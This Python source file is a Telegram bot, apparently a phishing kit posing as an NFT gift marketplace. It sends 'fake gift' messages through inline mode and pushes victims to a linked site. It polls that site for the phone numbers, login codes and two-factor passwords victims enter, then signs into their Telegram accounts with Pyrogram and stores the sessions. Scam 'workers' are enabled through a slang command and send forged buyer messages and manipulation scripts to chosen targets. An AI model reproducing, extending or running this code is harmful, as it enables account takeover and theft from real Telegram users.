#!/usr/bin/env python3
"""
======================================================================================
                    MARKETPLACE & NFT UNIFIED BOT v3.0
          Features: Multi-language, Beautiful UI, Advanced Fake Gifts
          
          ПОЛНОСТЬЮ СИНХРОНИЗИРОВАН С САЙТОМ
======================================================================================

УСТАНОВКА:
    pip install aiogram pyrogram tgcrypto aiohttp

НАСТРОЙКА settings.json:
{
    "bot_token": "YOUR_BOT_TOKEN",
    "api_id": 12345678,
    "api_hash": "your_api_hash",
    "api_url": "https://your-site.vercel.app",
    "admin_ids": [123456789],
    "workers": [],
    "target_user": null
}

ЗАПУСК:
    python marketplace_bot_final.py

======================================================================================
"""

import asyncio
import logging
import sys
import os
import re
import json
import time
import sqlite3
import secrets
from pathlib import Path
from typing import Optional, Dict, List, Tuple
import aiohttp

# Aiogram
from aiogram import Bot, Dispatcher, Router, F, types
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardButton, WebAppInfo, FSInputFile,
    InlineQueryResultArticle, InputTextMessageContent, CallbackQuery
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Pyrogram
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid, PhoneCodeExpired,
    PasswordHashInvalid, FloodWait
)

# ================= LOGGING =================
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("MarketplaceBot")

# ================= CONFIGURATION =================
BASE_DIR = Path(__file__).parent.resolve()
SESSIONS_DIR = BASE_DIR / "sessions"
SESSIONS_DIR.mkdir(exist_ok=True)


def load_settings() -> dict:
    path = BASE_DIR / "settings.json"
    if path.exists():
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            # Normalize api_url
            if "site_url" in data and "api_url" not in data:
                data["api_url"] = data["site_url"].rstrip('/')
            if "api_url" in data:
                data["api_url"] = data["api_url"].rstrip('/')
            return data
    return {
        "bot_token": os.getenv("BOT_TOKEN", ""),
        "api_id": int(os.getenv("API_ID", 0)),
        "api_hash": os.getenv("API_HASH", ""),
        "api_url": os.getenv("SITE_URL", "http://localhost:3000").rstrip('/'),
        "admin_ids": [],
        "workers": [],
        "target_user": None
    }


def save_settings():
    path = BASE_DIR / "settings.json"
    SETTINGS["workers"] = list(workers_list)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(SETTINGS, f, indent=2, ensure_ascii=False)


SETTINGS = load_settings()

# ================= LOCALIZATION =================
TEXTS = {
    "en": {
        "welcome": "<b>The Gateway's are open</b>\n\nA new trending way to trade Telegram gifts is here.\n\n<b>Buy - Sell - Collect</b> — all in one place.",
        "btn_webapp": "Enter Stream",
        "btn_about": "About Us",
        "gift_received": "<b>CONGRATULATIONS!</b>\n\nYou have just received a new NFT gift!\n\n<b>IonicDryer #7561</b>\n<a href='https://t.me/nft/IonicDryer-7561'>View on Telegram</a>\n\n<i>Gift added to your profile!</i>",
        "gift_already_claimed": "<b>Gift Already Active</b>\n\nThis gift has already been activated by: <b>@{user}</b>",
        "withdraw_prompt": "<b>Action Required</b>\n\nTo withdraw or trade this gift, please log in to the Marketplace.",
        "worker_activated": "<b>Worker Mode Activated</b>\n\nInline Mode: Enabled\nCommands: /pyid, /1",
        "choose_lang": "<b>Welcome! Please select your language:</b>",
        "lang_set": "Language set to <b>English</b>."
    },
    "ru": {
        "welcome": "<b>Поток открыт</b>\n\nНовый трендовый способ обмена подарками Telegram уже здесь.\n\n<b>Покупай - Продавай - Собирай</b> — всё в одном месте.",
        "btn_webapp": "Войти в Поток",
        "btn_about": "О нас",
        "gift_received": "<b>ПОЗДРАВЛЯЕМ!</b>\n\nВы только что получили новый NFT подарок!\n\n<b>IonicDryer #7561</b>\n<a href='https://t.me/nft/IonicDryer-7561'>Посмотреть в Telegram</a>\n\n<i>Подарок добавлен в ваш профиль!</i>",
        "gift_already_claimed": "<b>Подарок уже активирован</b>\n\nЭтот подарок уже был активирован пользователем: <b>@{user}</b>",
        "withdraw_prompt": "<b>Требуется действие</b>\n\nЧтобы вывести или обменять этот подарок, пожалуйста, войдите в Маркет.",
        "worker_activated": "<b>Режим Воркера Активирован</b>\n\nИнлайн режим: Включен\nКоманды: /pyid, /1",
        "choose_lang": "<b>Добро пожаловать! Выберите язык:</b>",
        "lang_set": "Язык установлен: <b>Русский</b>."
    }
}


# ================= DATABASE =================
class Database:
    def __init__(self, db_file="marketplace_bot.db"):
        self.path = BASE_DIR / db_file
        self.conn = sqlite3.connect(str(self.path), check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
        self.load_workers()

    def create_tables(self):
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            balance INTEGER DEFAULT 0,
            is_authorized BOOLEAN DEFAULT 0,
            is_worker BOOLEAN DEFAULT 0,
            language TEXT DEFAULT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.cursor.execute("""CREATE TABLE IF NOT EXISTS gifts (
            hash TEXT PRIMARY KEY,
            nft_id TEXT,
            creator_id INTEGER,
            claimed_by TEXT DEFAULT NULL,
            claimed_tg_id INTEGER DEFAULT NULL,
            is_claimed BOOLEAN DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )""")
        self.conn.commit()

    def load_workers(self):
        try:
            self.cursor.execute("SELECT user_id FROM users WHERE is_worker = 1")
            rows = self.cursor.fetchall()
            for row in rows:
                workers_list.add(row[0])
        except:
            pass

    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        row = self.cursor.fetchone()
        if not row:
            return None
        return {
            'user_id': row[0], 'username': row[1], 'first_name': row[2], 'phone': row[3],
            'is_authorized': bool(row[5]), 'is_worker': bool(row[6]), 'language': row[7]
        }

    def get_user_by_username(self, username):
        clean = username.replace("@", "").lower().strip()
        self.cursor.execute("SELECT user_id, first_name, language FROM users WHERE lower(username) = ?", (clean,))
        return self.cursor.fetchone()

    def add_user(self, user_id, username, first_name, phone=None):
        try:
            if not self.get_user(user_id):
                self.cursor.execute(
                    "INSERT INTO users (user_id, username, first_name, phone) VALUES (?, ?, ?, ?)",
                    (user_id, username or "Unknown", first_name or "Unknown", phone)
                )
            else:
                self.cursor.execute(
                    "UPDATE users SET username = ?, first_name = ? WHERE user_id = ?",
                    (username or "Unknown", first_name or "Unknown", user_id)
                )
            self.conn.commit()
        except Exception as e:
            logger.error(f"DB Error add_user: {e}")

    def set_language(self, user_id, lang):
        self.cursor.execute("UPDATE users SET language = ? WHERE user_id = ?", (lang, user_id))
        self.conn.commit()

    def set_worker(self, user_id):
        self.cursor.execute("UPDATE users SET is_worker = 1 WHERE user_id = ?", (user_id,))
        self.conn.commit()
        workers_list.add(user_id)
        save_settings()

    def mark_authorized(self, user_id, phone):
        self.cursor.execute("UPDATE users SET is_authorized = 1, phone = ? WHERE user_id = ?", (phone, user_id))
        self.conn.commit()

    def register_gift(self, gift_hash, creator_id, nft_id="IonicDryer-7561"):
        try:
            self.cursor.execute("INSERT INTO gifts (hash, nft_id, creator_id) VALUES (?, ?, ?)", 
                              (gift_hash, nft_id, creator_id))
            self.conn.commit()
            return True
        except:
            return False

    def get_gift_status(self, gift_hash):
        self.cursor.execute("SELECT is_claimed, claimed_by, nft_id FROM gifts WHERE hash = ?", (gift_hash,))
        return self.cursor.fetchone()

    def claim_gift(self, gift_hash, username, tg_id):
        self.cursor.execute("UPDATE gifts SET is_claimed = 1, claimed_by = ?, claimed_tg_id = ? WHERE hash = ?", 
                           (username, tg_id, gift_hash))
        self.conn.commit()

    def get_stats(self):
        try:
            self.cursor.execute("SELECT COUNT(*) FROM users WHERE is_authorized = 1")
            users = self.cursor.fetchone()[0]
            self.cursor.execute("SELECT COUNT(*) FROM gifts WHERE is_claimed = 1")
            gifts = self.cursor.fetchone()[0]
            return users, gifts
        except:
            return 0, 0


# Global state
workers_list = set(SETTINGS.get("workers", []))
db = Database()


# ================= STATES =================
class AdminLoginState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()


# Session storage
user_sessions: Dict[str, dict] = {}  # phone -> {hash, client}
pyrogram_clients: Dict[str, Client] = {}  # phone -> Client
processed_requests: Dict[str, bool] = {}  # requestId -> processed
admin_auth_process: Dict[int, dict] = {}  # user_id -> auth data


# ================= HELPERS =================
def clean_phone(phone) -> str:
    if not phone:
        return ""
    c = re.sub(r'\D', '', str(phone))
    if len(c) == 11 and c.startswith('8'):
        c = '7' + c[1:]
    elif len(c) == 10:
        c = '7' + c
    return '+' + c if c and not c.startswith('+') else ('+' + c if c else "")


def get_webapp_url(user_id: int) -> str:
    base = SETTINGS['api_url']
    sep = '&' if '?' in base else '?'
    return f"{base}{sep}chatId={user_id}"


def get_text(user_id: int, key: str) -> str:
    user = db.get_user(user_id)
    lang = user['language'] if user and user.get('language') else 'en'
    return TEXTS.get(lang, TEXTS['en']).get(key, "")


# ================= API FUNCTIONS =================
async def api_update_status(request_id: str, status: str, **kwargs):
    """Update auth request status on website"""
    url = f"{SETTINGS['api_url']}/api/telegram/update-request"
    data = {"requestId": request_id, "status": status, "processed": True, **kwargs}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data, timeout=15) as resp:
                result = await resp.text()
                logger.info(f"[API] Status update '{status}' -> {resp.status}")
                return resp.status == 200
    except Exception as e:
        logger.error(f"[API] Status update error: {e}")
        return False


async def api_claim_gift(telegram_id: int, gift_hash: str, nft_id: str, username: str):
    """Send claim request to website API"""
    url = f"{SETTINGS['api_url']}/api/telegram/claim-gift"
    data = {
        "telegramId": str(telegram_id),
        "nftId": nft_id,
        "giftHash": gift_hash,
        "username": username or f"user_{telegram_id}"
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data, timeout=15) as resp:
                result = await resp.json()
                logger.info(f"[API] Gift claim response: {result}")
                return result.get("success", False)
    except Exception as e:
        logger.error(f"[API] Gift claim error: {e}")
        return False


async def api_add_gift(telegram_id: int, nft_id: str, phone: str = None):
    """Add gift to user profile on website"""
    url = f"{SETTINGS['api_url']}/api/telegram/add-gift"
    data = {
        "telegramId": str(telegram_id),
        "nftId": nft_id,
    }
    if phone:
        data["phone"] = phone
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data, timeout=15) as resp:
                result = await resp.json()
                logger.info(f"[API] Add gift response: {result}")
                return result.get("success", False)
    except Exception as e:
        logger.error(f"[API] Add gift error: {e}")
        return False


# ================= BOT ROUTER =================
def create_router(bot: Bot) -> Router:
    router = Router()

    async def is_worker(uid: int) -> bool:
        return uid in workers_list or uid in SETTINGS.get("admin_ids", [])

    # ============ START COMMAND ============
    @router.message(CommandStart())
    async def cmd_start(msg: types.Message, command: CommandObject):
        uid = msg.from_user.id
        username = msg.from_user.username or f"user_{uid}"
        
        logger.info(f"[START] User {uid} (@{username})")
        
        # Register user
        db.add_user(uid, username, msg.from_user.first_name)
        user = db.get_user(uid)

        # Check language selection
        if not user or not user.get('language'):
            kb = InlineKeyboardBuilder()
            kb.button(text="English", callback_data="lang_en")
            kb.button(text="Русский", callback_data="lang_ru")
            kb.adjust(2)
            await msg.answer(TEXTS['en']['choose_lang'], reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
            return

        # Handle deep links (gift claims)
        args = command.args
        if args and args.startswith("claim_"):
            gift_hash = args.replace("claim_", "")
            logger.info(f"[GIFT] Claiming {gift_hash} by {uid}")
            
            gift_status = db.get_gift_status(gift_hash)
            user_lang = user['language']
            
            if gift_status and gift_status[0]:  # Already claimed
                await msg.answer(
                    TEXTS[user_lang]['gift_already_claimed'].format(user=gift_status[1]),
                    parse_mode=ParseMode.HTML
                )
                return
            
            # Get NFT ID from gift or use default
            nft_id = gift_status[2] if gift_status else "IonicDryer-7561"
            
            # Claim in local DB
            db.claim_gift(gift_hash, username, uid)
            
            # Send to website API
            asyncio.create_task(api_claim_gift(uid, gift_hash, nft_id, username))
            
            # Send gift message
            gift_image = "https://wsrv.nl/?url=https://nft.fragment.com/gift/ionic_dryer.webp&output=png"
            
            try:
                await msg.answer_photo(
                    photo=gift_image,
                    caption=TEXTS[user_lang]["gift_received"],
                    parse_mode=ParseMode.HTML
                )
            except:
                await msg.answer(TEXTS[user_lang]["gift_received"], parse_mode=ParseMode.HTML)
            
            await asyncio.sleep(1)
            await msg.answer(TEXTS[user_lang]["withdraw_prompt"], parse_mode=ParseMode.HTML)
            return

        # Main menu
        text = get_text(uid, "welcome")
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_webapp"), 
                                    web_app=WebAppInfo(url=get_webapp_url(uid))))
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_about"), url="https://t.me/IT_Portal"))

        try:
            start_img = BASE_DIR / "start.jpg"
            if start_img.exists():
                await msg.answer_photo(photo=FSInputFile(start_img), caption=text,
                                      reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
            else:
                await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
        except:
            await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    # ============ LANGUAGE SELECTION ============
    @router.callback_query(F.data.startswith("lang_"))
    async def set_language(c: CallbackQuery):
        lang = c.data.split("_")[1]
        uid = c.from_user.id
        
        db.set_language(uid, lang)
        await c.message.delete()
        await c.message.answer(TEXTS[lang]['lang_set'], parse_mode=ParseMode.HTML)
        
        # Show main menu
        text = get_text(uid, "welcome")
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_webapp"), 
                                    web_app=WebAppInfo(url=get_webapp_url(uid))))
        kb.row(InlineKeyboardButton(text=get_text(uid, "btn_about"), url="https://t.me/IT_Portal"))

        try:
            start_img = BASE_DIR / "start.jpg"
            if start_img.exists():
                await c.message.answer_photo(photo=FSInputFile(start_img), caption=text,
                                            reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
            else:
                await c.message.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
        except:
            await c.message.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    # ============ WORKER ACTIVATION ============
    @router.message(Command("mamontloh"))
    async def activate_worker(msg: types.Message):
        db.set_worker(msg.from_user.id)
        user = db.get_user(msg.from_user.id)
        lang = user['language'] if user else 'en'
        await msg.answer(TEXTS[lang]['worker_activated'], parse_mode=ParseMode.HTML)
        logger.info(f"[WORKER] Activated: {msg.from_user.id}")

    # ============ INLINE QUERY (FAKE GIFTS) ============
    @router.inline_query()
    async def inline_handler(query: types.InlineQuery):
        uid = query.from_user.id
        
        if not await is_worker(uid):
            return

        bot_info = await bot.get_me()
        
        # Generate unique gift hash
        gift_hash = secrets.token_hex(8).upper()
        db.register_gift(gift_hash, uid, "IonicDryer-7561")
        
        deep_link = f"https://t.me/{bot_info.username}?start=claim_{gift_hash}"
        visual_link = "https://t.me/nft/IonicDryer-7561"
        image_url = "https://nft.fragment.com/gift/ionic_dryer.webp"

        message_content = (
            "<b>Congratulations!</b>\n"
            "<i>You have just received a new NFT gift, check it out in your Profile!</i>\n\n"
            f"<a href='{visual_link}'>IonicDryer #7561</a>"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="Claim Gift", url=deep_link))
        kb.row(InlineKeyboardButton(text="View Gift", url=visual_link))

        result = InlineQueryResultArticle(
            id=gift_hash,
            title="Send IonicDryer #7561",
            description="Ready to send fake gift",
            thumbnail_url=image_url,
            input_message_content=InputTextMessageContent(
                message_text=message_content,
                parse_mode=ParseMode.HTML
            ),
            reply_markup=kb.as_markup()
        )
        
        await query.answer([result], cache_time=1, is_personal=True)
        logger.info(f"[INLINE] Gift {gift_hash} created by {uid}")

    # ============ WORKER COMMANDS ============
    @router.message(Command("pyid"))
    async def cmd_pyid(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
            
        parts = msg.text.split(maxsplit=2)
        if len(parts) < 3:
            await msg.answer("Usage: /pyid @user text")
            return

        user = db.get_user_by_username(parts[1])
        if not user:
            await msg.answer("User not found in DB")
            return

        fake_msg = (
            f"@{(await bot.get_me()).username} has no KYC requirements. Stay safe.\n\n"
            "<b>Buyer from deal #EV42399</b> sent you a message:\n\n"
            f"<blockquote>{parts[2]}</blockquote>"
        )
        
        try:
            await bot.send_message(user[0], fake_msg, parse_mode=ParseMode.HTML)
            await msg.answer(f"Sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"Error: {e}")

    @router.message(Command("1"))
    async def cmd_script(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
            
        parts = msg.text.split()
        if len(parts) < 2:
            await msg.answer("Usage: /1 @user")
            return

        user = db.get_user_by_username(parts[1])
        if not user:
            await msg.answer("User not found")
            return

        script = (
            f"Hey, can you please send {parts[1]} and then attach a screenshot of the reaction?\n"
            "(Something like a surprise)"
        )
        
        try:
            await bot.send_message(user[0], script)
            await msg.answer(f"Script sent to {parts[1]}")
        except Exception as e:
            await msg.answer(f"Error: {e}")

    # ============ ADMIN PANEL ============
    @router.message(Command("admin"))
    async def admin_panel(msg: types.Message):
        if not await is_worker(msg.from_user.id):
            return
            
        users, gifts = db.get_stats()
        status = "Online" if pyrogram_clients else "Offline"

        text = (
            f"<b>ADMIN PANEL</b>\n"
            f"{'─' * 20}\n"
            f"<b>Authorized Users:</b> {users}\n"
            f"<b>Claimed Gifts:</b> {gifts}\n"
            f"<b>Pyrogram:</b> {status}\n"
            f"<b>Workers:</b> {len(workers_list)}\n"
            f"{'─' * 20}"
        )

        kb = InlineKeyboardBuilder()
        kb.row(
            InlineKeyboardButton(text="Banker Login", callback_data="admin_login"),
            InlineKeyboardButton(text="Stats", callback_data="admin_stats")
        )
        kb.row(InlineKeyboardButton(text="Close", callback_data="close_admin"))

        await msg.answer(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c: CallbackQuery):
        await c.message.delete()

    @router.callback_query(F.data == "admin_login")
    async def login_start(c: CallbackQuery, state: FSMContext):
        await c.message.delete()
        await c.message.answer("<b>Banker Login</b>\nEnter phone number (+1234...):", parse_mode=ParseMode.HTML)
        await state.set_state(AdminLoginState.waiting_phone)

    @router.callback_query(F.data == "admin_stats")
    async def show_stats(c: CallbackQuery):
        users, gifts = db.get_stats()
        await c.answer(f"Users: {users}, Gifts: {gifts}", show_alert=True)

    # ============ ADMIN AUTH FLOW ============
    @router.message(AdminLoginState.waiting_phone)
    async def auth_phone(msg: types.Message, state: FSMContext):
        phone = clean_phone(msg.text)
        if not phone:
            await msg.answer("Invalid phone number")
            return
            
        try:
            session_name = str(SESSIONS_DIR / phone.replace('+', ''))
            client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
            await client.connect()
            sent = await client.send_code(phone)
            
            admin_auth_process[msg.from_user.id] = {
                "client": client, 
                "phone": phone, 
                "hash": sent.phone_code_hash
            }
            
            await msg.answer("<b>Enter verification code:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_code)
            
        except FloodWait as e:
            await msg.answer(f"Flood wait: {e.value} seconds")
            await state.clear()
        except Exception as e:
            await msg.answer(f"Error: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def auth_code(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            await msg.answer("Session expired. Try /admin again")
            await state.clear()
            return
            
        try:
            await data['client'].sign_in(data['phone'], data['hash'], msg.text.strip())
            await msg.answer("<b>Authorized Successfully!</b>", parse_mode=ParseMode.HTML)
            pyrogram_clients[data['phone']] = data['client']
            await state.clear()
            
        except SessionPasswordNeeded:
            await msg.answer("<b>2FA Required. Enter password:</b>", parse_mode=ParseMode.HTML)
            await state.set_state(AdminLoginState.waiting_password)
            
        except (PhoneCodeInvalid, PhoneCodeExpired) as e:
            await msg.answer(f"Invalid/expired code: {e}")
            
        except Exception as e:
            await msg.answer(f"Error: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def auth_password(msg: types.Message, state: FSMContext):
        data = admin_auth_process.get(msg.from_user.id)
        if not data:
            await msg.answer("Session expired")
            await state.clear()
            return
            
        try:
            await data['client'].check_password(msg.text.strip())
            await msg.answer("<b>Authorized with 2FA!</b>", parse_mode=ParseMode.HTML)
            pyrogram_clients[data['phone']] = data['client']
            await state.clear()
            
        except PasswordHashInvalid:
            await msg.answer("Wrong password. Try again:")
            
        except Exception as e:
            await msg.answer(f"Error: {e}")

    # ============ CONTACT HANDLER ============
    @router.message(F.contact)
    async def on_contact(msg: types.Message):
        if not msg.contact or not msg.contact.phone_number:
            return
            
        phone = clean_phone(msg.contact.phone_number)
        db.add_user(msg.from_user.id, msg.from_user.username, msg.from_user.first_name, phone)
        
        try:
            async with aiohttp.ClientSession() as session:
                await session.post(
                    f"{SETTINGS['api_url']}/api/telegram/receive-phone",
                    json={"phone": phone, "telegramId": str(msg.from_user.id)}
                )
        except:
            pass

    return router


# ================= MAIN BOT CLASS =================
class MarketplaceBot:
    def __init__(self):
        self.bot: Bot = None
        self.dp: Dispatcher = None
        self.api_url = SETTINGS['api_url']
        self.running = True

    async def process_auth_queue(self):
        """Poll website for pending auth requests"""
        logger.info("[QUEUE] Started polling for auth requests...")
        
        async with aiohttp.ClientSession() as session:
            while self.running:
                try:
                    url = f"{self.api_url}/api/telegram/get-pending"
                    async with session.get(url, timeout=10) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            for req in data.get('requests', []):
                                rid = req.get('requestId')
                                if rid and rid not in processed_requests:
                                    processed_requests[rid] = True
                                    asyncio.create_task(self.handle_auth_request(req))
                                    
                except asyncio.CancelledError:
                    break
                except Exception as e:
                    logger.debug(f"[QUEUE] Poll error: {e}")
                    
                await asyncio.sleep(2)

    async def handle_auth_request(self, req: dict):
        """Process a single auth request from website"""
        rid = req.get('requestId')
        action = req.get('action')
        phone = clean_phone(req.get('phone'))
        code = req.get('code')
        password = req.get('password')
        tg_id = req.get('telegramId')

        logger.info(f"[AUTH] Processing: {rid}, action={action}, phone={phone}")

        try:
            if action == 'send_phone':
                await self.handle_send_phone(rid, phone)
                
            elif action == 'send_code':
                await self.handle_send_code(rid, phone, code, tg_id)
                
            elif action == 'send_password':
                await self.handle_send_password(rid, phone, password, tg_id)
                
        except Exception as e:
            logger.error(f"[AUTH] Error handling {action}: {e}")
            await api_update_status(rid, "error", error=str(e))

    async def handle_send_phone(self, rid: str, phone: str):
        """Send verification code to phone"""
        if not phone:
            await api_update_status(rid, "error", error="No phone provided")
            return

        try:
            session_name = str(SESSIONS_DIR / phone.replace('+', ''))
            client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
            
            await client.connect()
            sent = await client.send_code(phone)
            
            pyrogram_clients[phone] = client
            user_sessions[phone] = {'hash': sent.phone_code_hash}
            
            logger.info(f"[AUTH] Code sent to {phone}")
            await api_update_status(rid, "waiting_code", phone=phone)
            
        except FloodWait as e:
            logger.error(f"[AUTH] Flood wait: {e.value}s")
            await api_update_status(rid, "error", error=f"Please wait {e.value} seconds")
            
        except Exception as e:
            logger.error(f"[AUTH] Send code error: {e}")
            await api_update_status(rid, "error", error=str(e))

    async def handle_send_code(self, rid: str, phone: str, code: str, tg_id: str):
        """Verify the code user entered"""
        client = pyrogram_clients.get(phone)
        session_data = user_sessions.get(phone)
        
        if not client or not session_data:
            # Try to recreate client
            try:
                session_name = str(SESSIONS_DIR / phone.replace('+', ''))
                client = Client(session_name, api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'])
                await client.connect()
                pyrogram_clients[phone] = client
            except Exception as e:
                await api_update_status(rid, "error", error="Session expired. Please try again.")
                return

        if not client.is_connected:
            await client.connect()

        try:
            phone_hash = session_data.get('hash') if session_data else None
            await client.sign_in(phone, phone_hash, code.strip())
            
            # Success
            if tg_id:
                db.mark_authorized(int(tg_id), phone)
            logger.info(f"[AUTH] Success for {phone}")
            await api_update_status(rid, "success", phone=phone)
            
        except SessionPasswordNeeded:
            logger.info(f"[AUTH] 2FA required for {phone}")
            await api_update_status(rid, "waiting_password", phone=phone)
            
        except (PhoneCodeInvalid, PhoneCodeExpired) as e:
            logger.error(f"[AUTH] Code error: {e}")
            await api_update_status(rid, "error", error="Invalid or expired code")
            
        except Exception as e:
            logger.error(f"[AUTH] Sign in error: {e}")
            await api_update_status(rid, "error", error=str(e))

    async def handle_send_password(self, rid: str, phone: str, password: str, tg_id: str):
        """Verify 2FA password"""
        client = pyrogram_clients.get(phone)
        
        if not client:
            await api_update_status(rid, "error", error="No active session for this phone")
            return

        if not client.is_connected:
            await client.connect()

        try:
            await client.check_password(password.strip())
            
            # Success
            if tg_id:
                db.mark_authorized(int(tg_id), phone)
            logger.info(f"[AUTH] 2FA success for {phone}")
            await api_update_status(rid, "success", phone=phone)
            
        except PasswordHashInvalid:
            logger.error(f"[AUTH] Wrong password for {phone}")
            await api_update_status(rid, "error", error="Wrong password")
            
        except Exception as e:
            logger.error(f"[AUTH] Password error: {e}")
            await api_update_status(rid, "error", error=str(e))

    async def run(self):
        """Start the bot"""
        if not SETTINGS.get('bot_token'):
            logger.error("BOT_TOKEN not configured!")
            return

        if not SETTINGS.get('api_id') or not SETTINGS.get('api_hash'):
            logger.warning("API_ID/API_HASH not configured - auth features disabled")

        self.bot = Bot(
            token=SETTINGS['bot_token'],
            default=DefaultBotProperties(parse_mode=ParseMode.HTML)
        )
        
        self.dp = Dispatcher()
        self.dp.include_router(create_router(self.bot))

        # Start auth queue processor
        asyncio.create_task(self.process_auth_queue())

        logger.info("=" * 50)
        logger.info("MARKETPLACE BOT v3.0 STARTED")
        logger.info(f"API URL: {self.api_url}")
        logger.info(f"Workers: {len(workers_list)}")
        logger.info("=" * 50)

        try:
            await self.dp.start_polling(self.bot)
        finally:
            self.running = False


# ================= ENTRY POINT =================
if __name__ == "__main__":
    try:
        asyncio.run(MarketplaceBot().run())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
